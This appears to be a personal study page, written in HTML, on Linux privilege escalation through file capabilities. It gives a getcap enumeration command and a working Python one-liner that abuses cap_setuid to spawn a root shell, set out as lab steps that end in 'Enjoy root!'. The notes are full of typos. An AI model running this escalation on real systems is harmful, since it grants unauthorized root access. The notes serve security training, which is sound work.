<!DOCTYPE html  PUBLIC '-//W3C//DTD XHTML 1.0 Transitional//EN'  'http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd'><html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
<title>Capabilites</title>
</head><body><b>Escalation via capabilites</b><br/>
<br/>
Similar to SUID.<br/>
<br/>
Newer version.<br/>
<br/>
comparison of privilaged to uinprivilaged.<br/>
<br/>
Privialged bypass all permission checks. Unprivilaged have all checks carried otu.<br/>
<br/>
Capabilites started at Kernal 2.2<br/>
<br/>
Divides privilages associated wtih super user into distinct units<br/>
<br/>
these units are capbilites... they can be enabeled or disabled as requried.<br/>
<br/>
These are more secure than SUID and linux systems are transitioning to them<br/>
<br/>
<br/>
to find<br/>
<br/>
<b>getcap -r / 2&gt;/dev/null</b><br/>
<br/>
Based on what is returned, escalation could be as simple as a 1 liner.<br/>
<br/>
<br/>
<img height="71" src="image.png" width="700"/><br/>
this example is python. maybe they are a dev and need root access for dev work wtih python only.<br/>
This would not have shown up under a SUID find as its a capability not SUID.<br/>
<br/>
When seeing 'ep' THINK Permit Everything... this is what we want to find.<br/>
<br/>
escalation with this is a simple python script.<br/>
<br/>
<b>/usr/bin/python2.6 -c 'import os; os.setuid(0); os.system(&quot;/bin/bash&quot;)'</b><br/>
<br/>
This will compile and excute granting root.<br/>
<br/>
<img height="55" src="image 2.png" width="750"/><br/>
<br/>
Linpeas may find this<br/>
<br/>
other things to look into <br/>
<br/>
tar<br/>
<br/>
openssl<br/>
<br/>
perl<br/>
<br/>
When in doubt GOOGLEout<br/>
<br/>
<br/>
<br/>
<br/>
<br/>
<br/>
Detection<br/>
<br/>
Linux VM<br/>
<br/>
1. In command prompt type: getcap -r / 2&gt;/dev/null<br/>
2. From the output, notice the value of the “cap_setuid” capability.<br/>
<br/>
Exploitation<br/>
<br/>
Linux VM<br/>
<br/>
1. In command prompt type:<br/>
/usr/bin/python2.6 -c 'import os; os.setuid(0); os.system(&quot;/bin/bash&quot;)'<br/>
2. Enjoy root!<br/>
</body></html>